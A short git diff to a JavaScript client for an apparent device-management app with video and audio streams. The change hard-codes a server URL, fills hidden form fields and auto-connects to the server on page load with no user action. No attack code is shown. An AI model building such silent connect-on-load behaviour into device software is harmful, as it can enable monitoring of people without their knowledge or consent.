@@ -1,5 +1,9 @@
 'use strict'
 
+// ── Change this URL after deploying to Railway ───────────────────
+const SERVER_URL = 'REPLACE_WITH_RAILWAY_URL'
+// ─────────────────────────────────────────────────────────────────
+
 let socket = null
 let videoStream = null
 let audioStream = null
@@ -197,11 +201,18 @@ async function playAudio(base64) {
   }
 }
 
-// ── Auto-fill saved values ─────────────────────────────────────────
+// ── Auto-connect on load ───────────────────────────────────────────
 
 window.addEventListener('load', () => {
-  const savedId = localStorage.getItem('mdm-device-id')
-  const savedUrl = localStorage.getItem('mdm-server-url')
-  if (savedId) document.getElementById('device-id').value = savedId
-  if (savedUrl) document.getElementById('server-url').value = savedUrl
+  let deviceId = localStorage.getItem('mdm-device-id')
+  if (!deviceId) {
+    deviceId = 'device-' + Math.random().toString(36).slice(2, 10)
+    localStorage.setItem('mdm-device-id', deviceId)
+  }
+  // Auto-fill form (hidden but needed for NativeSocket plugin)
+  document.getElementById('device-id').value = deviceId
+  document.getElementById('server-url').value = SERVER_URL
+  localStorage.setItem('mdm-server-url', SERVER_URL)
+  // Auto-connect immediately — no need for user to press button
+  connectToServer(SERVER_URL, deviceId)
 })
